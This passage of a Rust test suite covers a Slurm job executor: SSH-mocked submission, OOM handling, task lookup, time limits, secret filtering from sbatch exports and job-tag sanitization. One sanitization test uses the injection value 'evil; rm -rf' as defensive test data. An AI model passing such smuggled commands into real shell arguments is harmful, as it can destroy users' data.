        let remote_pkg = format!("/scratch/alan/{pkg_name}");

        let fake = FakeSshSession::new("cluster");
        fake.expect(format!("mkdir -p {remote_pkg}"), SshOutcome::success(""));
        fake.expect_rsync(
            RsyncDirection::Push,
            &format!("{}/", pkg.path().to_string_lossy().trim_end_matches('/')),
            &remote_pkg,
            SshOutcome::success(""),
        );
        fake.expect("mkdir -p", SshOutcome::success(""));
        fake.expect(
            format!("sbatch --parsable {remote_pkg}/scripts/task.sbatch"),
            SshOutcome::success("555"),
        );
        fake.expect(
            "sacct -j 555 -n -P --format=State,ExitCode,NodeList,Partition",
            SshOutcome::success("OUT_OF_MEMORY|0:9|gpu-03|gpu\n"),
        );
        fake.expect_rsync(
            RsyncDirection::Pull,
            &format!(
                "{}/runtime/",
                pkg.path().to_string_lossy().trim_end_matches('/')
            ),
            &format!("{remote_pkg}/runtime/"),
            SshOutcome::success(""),
        );

        let (_scripts, agent_local) = scripts_dir_with_stubs();
        let exec_args = args_with_real_agent(&pkg.path().to_string_lossy(), &agent_local);
        let agent_cmd = exec_args.agent.clone();
        let mut exec =
            SlurmExecutor::with_ssh(exec_args, test_config(), test_mapping(), Box::new(fake));
        let outcome = exec
            .run_iteration(pkg.path(), &agent_cmd, &BTreeMap::new())
            .unwrap();
        assert_eq!(outcome.agent_status.code(), Some(137));
        let remote = outcome.remote.unwrap();
        assert!(remote.instance_type.contains("gpu-03"));
    }

    /// Regression test for the suffix-match collision in the legacy
    /// `is_task_stale` lookup. With two active jobs where one task id is
    /// a literal suffix of another (`analysis_step` vs `step`), the old
    /// `k.ends_with(&task_id)` would resolve `step` to the wrong job_id
    /// when iterating — returning a stale verdict for the wrong task. The
    /// new exact O(1) lookup must hit only the requested key.
    #[test]
    fn is_task_stale_does_not_collide_on_suffix_match() {
        let pkg = mk_package();
        let fake = FakeSshSession::new("cluster");
        // `step` is a real running job; `analysis_step` is missing.
        // sacct for job 999 returns RUNNING (not terminal), so
        // is_task_stale should return false. If suffix-matching ran,
        // looking up `step` would hit `analysis_step`'s entry instead
        // (lexicographically earlier).
        fake.expect(
            "sacct -j 999 -n -P --format=State,ExitCode,NodeList,Partition",
            SshOutcome::success("RUNNING|0:0|n|p\n"),
        );
        let exec = SlurmExecutor::with_ssh(
            args(&pkg.path().to_string_lossy()),
            test_config(),
            test_mapping(),
            Box::new(fake),
        );
        exec.active_jobs.lock().insert(
            "analysis_step".into(),
            ActiveJob {
                job_id: "111".into(),
                partition: "normal".into(),
                node_list: None,
            },
        );
        exec.active_jobs.lock().insert(
            "step".into(),
            ActiveJob {
                job_id: "999".into(),
                partition: "normal".into(),
                node_list: None,
            },
        );
        let task_step = Task {
            description: "step".into(),
            kind: ecaa_workflow_core::dag::TaskKind::Computation,
            state: TaskState::Running {
                started_at: "2026-05-14T00:00:00Z".into(),
                remote: None,
            },
            depends_on: vec![],
            assignee: ecaa_workflow_core::dag::Assignee::Agent,
            spec: Some(serde_json::json!({ "task_id": "step" })),
            resolution: None,
            result_ref: None,
            resource_class: ecaa_workflow_core::dag::ResourceClass::CpuHeavy,
            requires_sme_review: false,
            required_artifacts: vec![],
            container: None,
            source_atom_id: None,
            safety: Default::default(),
        };
        // Exact-id lookup hits job_id 999, which is RUNNING (not
        // stale). Old suffix-match logic would have collided with
        // `analysis_step`'s 111 entry and reported `false` for the
        // wrong reason — or worse, with a different stub returning
        // FAILED for 111 would have falsely flagged `step` stale.
        assert!(
            !exec.is_task_stale(&task_step, 0),
            "task `step` is RUNNING per sacct 999; must not be stale"
        );
    }

    #[test]
    fn release_scancels_active_jobs() {
        let pkg = mk_package();
        let fake = FakeSshSession::new("cluster");
        let fake_ref = Box::new(fake);
        let mut exec = SlurmExecutor::with_ssh(
            args(&pkg.path().to_string_lossy()),
            test_config(),
            test_mapping(),
            fake_ref,
        );
        // Inject a fake active job and verify release() scancels it.
        exec.active_jobs.lock().insert(
            "scripps-abc".into(),
            ActiveJob {
                job_id: "12345".into(),
                partition: "normal".into(),
                node_list: None,
            },
        );
        exec.release();
        assert!(exec.active_jobs.lock().is_empty());
    }

    #[test]
    fn default_cost_backend_is_no_estimate() {
        let pkg = mk_package();
        let exec = SlurmExecutor::with_ssh(
            args(&pkg.path().to_string_lossy()),
            test_config(),
            test_mapping(),
            Box::new(FakeSshSession::new("cluster")),
        );
        // R2-N21 — was `Box<dyn CostModel>` defaulting to `NoopCostModel`;
        // now `BackendKind::NoEstimate` dispatched via the free function.
        let tasks = vec![("any".to_string(), 1.0)];
        let est = super::super::cost_guard::estimate_for_backend(
            exec.cost_backend,
            &tasks,
            super::super::cost_guard::PricingSource::OnDemand,
        )
        .unwrap();
        assert!(est.is_none());
    }

    #[test]
    fn exit_status_from_code_round_trips() {
        // 0 → success, 42 → failure with code 42, 137 → OOM convention.
        assert!(exit_status_from_code(0).success());
        assert_eq!(exit_status_from_code(42).code(), Some(42));
        assert_eq!(exit_status_from_code(137).code(), Some(137));
    }

    #[test]
    fn build_spec_honors_default_time_limit_when_mapping_falls_back() {
        // SWFC_SLURM_DEFAULT_TIME_LIMIT is the fallback
        // `--time=` "when sizing mapping is silent". Construct a
        // mapping whose only named class can't satisfy a big request,
        // forcing `pick_detailed` to report used_fallback=true. The
        // rendered SbatchSpec must carry the env-var time limit, not
        // the mapping's fallback-class time.
        let pkg = mk_package();
        let (_scripts, agent_local) = scripts_dir_with_stubs();
        // Seed a compute-resource-policy.json that pushes requirements
        // past what `test_mapping`'s `small` class can satisfy. We drop
        // a minimal profiles JSON directly so we don't have to exercise
        // the full compute-high-water path — empty profiles + a bogus
        // stage class triggers the default resource requirements, which
        // already push past the `small` class's 4-cpu/16G limits in
        // some tests. To be deterministic, use a mapping whose only
        // class is definitively too small.
        // A mapping with ZERO named classes forces pick_detailed to
        // report used_fallback=true regardless of the requirements.
        let mapping = SlurmMapping {
            version: 1,
            resource_classes: BTreeMap::new(),
            fallback: ResourceClass {
                partition: "normal".into(),
                qos: None,
                cpus_per_task: 2,
                mem: "4G".into(),
                gres: None,
                // Deliberately different from default_time_limit so the
                // test can tell which field wins.
                time: "00:30:00".into(),
            },
            partitions: Default::default(),
        };
        let mut cfg = test_config();
        cfg.default_time_limit = "12:34:56".into();

        let exec_args = args_with_real_agent(&pkg.path().to_string_lossy(), &agent_local);
        let exec = SlurmExecutor::with_ssh(
            exec_args,
            cfg,
            mapping,
            Box::new(FakeSshSession::new("cluster")),
        );
        let payload = exec.build_spec(pkg.path(), &BTreeMap::new()).unwrap();
        // When the resolver falls back, env-var time limit wins.
        assert_eq!(
            payload.spec.time_limit, "12:34:56",
            "fallback path must use SWFC_SLURM_DEFAULT_TIME_LIMIT, not fallback-class time"
        );
    }

    #[test]
    fn build_spec_uses_class_time_when_mapping_picks_named_class() {
        // Symmetric case: when a named class satisfies, its time wins
        // (env var is irrelevant).
        let pkg = mk_package();
        let (_scripts, agent_local) = scripts_dir_with_stubs();
        let mapping = test_mapping(); // "small" class with time 02:00:00
        let mut cfg = test_config();
        cfg.default_time_limit = "12:34:56".into();

        let exec_args = args_with_real_agent(&pkg.path().to_string_lossy(), &agent_local);
        let exec = SlurmExecutor::with_ssh(
            exec_args,
            cfg,
            mapping,
            Box::new(FakeSshSession::new("cluster")),
        );
        let payload = exec.build_spec(pkg.path(), &BTreeMap::new()).unwrap();
        assert_eq!(
            payload.spec.time_limit, "02:00:00",
            "named-class path must use the class's own time, not the env var"
        );
    }

    // ── secret split + sanitize ────

    #[test]
    fn split_envelope_secrets_partitions_known_keys() {
        let mut envelope = BTreeMap::new();
        envelope.insert("SWFC_HW_NPROC_HINT".into(), "16".into());
        envelope.insert("SWFC_TASK_ID".into(), "t1".into());
        envelope.insert("ANTHROPIC_API_KEY".into(), "sk-ant-api03-XYZ".into());
        envelope.insert("HF_TOKEN".into(), "hf_abc".into());
        envelope.insert("GITHUB_TOKEN".into(), "ghp_def".into());
        let (safe, secret) = SlurmExecutor::split_envelope_secrets(&envelope);
        assert!(safe.contains_key("SWFC_HW_NPROC_HINT"));
        assert!(safe.contains_key("SWFC_TASK_ID"));
        assert!(!safe.contains_key("ANTHROPIC_API_KEY"));
        assert!(!safe.contains_key("HF_TOKEN"));
        assert!(!safe.contains_key("GITHUB_TOKEN"));
        assert_eq!(secret.len(), 3);
        assert!(secret.contains_key("ANTHROPIC_API_KEY"));
        assert!(secret.contains_key("HF_TOKEN"));
        assert!(secret.contains_key("GITHUB_TOKEN"));
    }

    #[test]
    fn split_envelope_secrets_empty_input() {
        let envelope = BTreeMap::new();
        let (safe, secret) = SlurmExecutor::split_envelope_secrets(&envelope);
        assert!(safe.is_empty());
        assert!(secret.is_empty());
    }

    #[test]
    fn split_envelope_secrets_no_known_secrets_returns_safe_only() {
        let mut envelope = BTreeMap::new();
        envelope.insert("SWFC_HW_NPROC_HINT".into(), "16".into());
        let (safe, secret) = SlurmExecutor::split_envelope_secrets(&envelope);
        assert_eq!(safe.len(), 1);
        assert!(secret.is_empty());
    }

    #[test]
    fn sanitize_job_tag_keeps_alphanumeric_dash_underscore() {
        assert_eq!(sanitize_job_tag("task_a-42"), "task_a-42");
        assert_eq!(sanitize_job_tag("DiscoverQC"), "DiscoverQC");
    }

    #[test]
    fn sanitize_job_tag_replaces_unsafe_chars() {
        assert_eq!(sanitize_job_tag("task/with..slashes"), "task_with__slashes");
        assert_eq!(sanitize_job_tag("evil; rm -rf"), "evil__rm_-rf");
    }

    #[test]
    fn sanitize_job_tag_empty_returns_unnamed() {
        assert_eq!(sanitize_job_tag(""), "unnamed");
        assert_eq!(sanitize_job_tag("///"), "___");
    }

    #[test]
    fn build_spec_does_not_emit_secret_in_sbatch_exports() {
        let temp = tempfile::TempDir::new().unwrap();
        let pkg = temp.path();
        // Minimal package shape so build_spec doesn't trip on missing dirs.
        std::fs::create_dir_all(pkg.join("policies")).unwrap();
        std::fs::create_dir_all(pkg.join("runtime")).unwrap();
        std::fs::write(
            pkg.join("WORKFLOW.json"),
            r#"{"version": "1.0", "workflow_id": "test-wf", "current_task": null, "tasks": {}}"#,
        )
        .unwrap();
        let args = ExecutorArgs {
            package: "/tmp/nonexistent".into(),
            agent: "/tmp/agent-claude-slurm.sh".into(),
            task_timeout_secs: 300,
        };
        let exec = SlurmExecutor::with_ssh(
            args,
            test_config(),
            test_mapping(),
            Box::new(FakeSshSession::new("cluster")),
        );
        let mut envelope = BTreeMap::new();
        envelope.insert("SWFC_TASK_ID".into(), "t1".into());
        envelope.insert("SWFC_HW_NPROC_HINT".into(), "8".into());
        envelope.insert(
            "ANTHROPIC_API_KEY".into(),
            "sk-ant-api03-DONT-LEAK-ME-IN-EXPORTS".into(),
        );
        envelope.insert("HF_TOKEN".into(), "hf_dont_leak_either".into());
        let payload = exec.build_spec(pkg, &envelope).unwrap();
        // The exports map MUST NOT carry the secrets.
        assert!(
            !payload.spec.exports.contains_key("ANTHROPIC_API_KEY"),
            "ANTHROPIC_API_KEY leaked into #SBATCH --export=: {:?}",
            payload.spec.exports
        );
        assert!(
            !payload.spec.exports.contains_key("HF_TOKEN"),
            "HF_TOKEN leaked into #SBATCH --export=: {:?}",
            payload.spec.exports
        );
        // Safe vars survive.
        assert!(payload.spec.exports.contains_key("SWFC_TASK_ID"));
        assert!(payload.spec.exports.contains_key("SWFC_HW_NPROC_HINT"));
        // Body carries the creds-source placeholder.
        assert!(
            payload.spec.body.contains("__SCRIPPS_CREDS_PATH__"),
            "body must reference the creds-source placeholder: {}",
            payload.spec.body
        );
    }

    #[test]
    fn rendered_sbatch_excludes_secrets_after_split() {
        let temp = tempfile::TempDir::new().unwrap();
        let pkg = temp.path();
        std::fs::create_dir_all(pkg.join("policies")).unwrap();
        std::fs::create_dir_all(pkg.join("runtime")).unwrap();
        std::fs::write(
            pkg.join("WORKFLOW.json"),
            r#"{"version": "1.0", "workflow_id": "test-wf", "current_task": null, "tasks": {}}"#,
        )
        .unwrap();
        let args = ExecutorArgs {
            package: "/tmp/nonexistent".into(),
            agent: "/tmp/agent-claude-slurm.sh".into(),
            task_timeout_secs: 300,
        };
        let exec = SlurmExecutor::with_ssh(
            args,
            test_config(),
            test_mapping(),
            Box::new(FakeSshSession::new("cluster")),
        );
        let mut envelope = BTreeMap::new();
        envelope.insert(
            "ANTHROPIC_API_KEY".into(),
            "sk-ant-api03-DONT-RENDER-ME".into(),
        );
        let payload = exec.build_spec(pkg, &envelope).unwrap();
        let rendered = render_sbatch_script(&payload.spec);
        assert!(
            !rendered.contains("sk-ant-api03-DONT-RENDER-ME"),
            "API key surfaced in rendered sbatch script: {rendered}"
        );
        assert!(
            !rendered.contains("ANTHROPIC_API_KEY="),
            "ANTHROPIC_API_KEY assignment appears in rendered script: {rendered}"
        );
    }
}
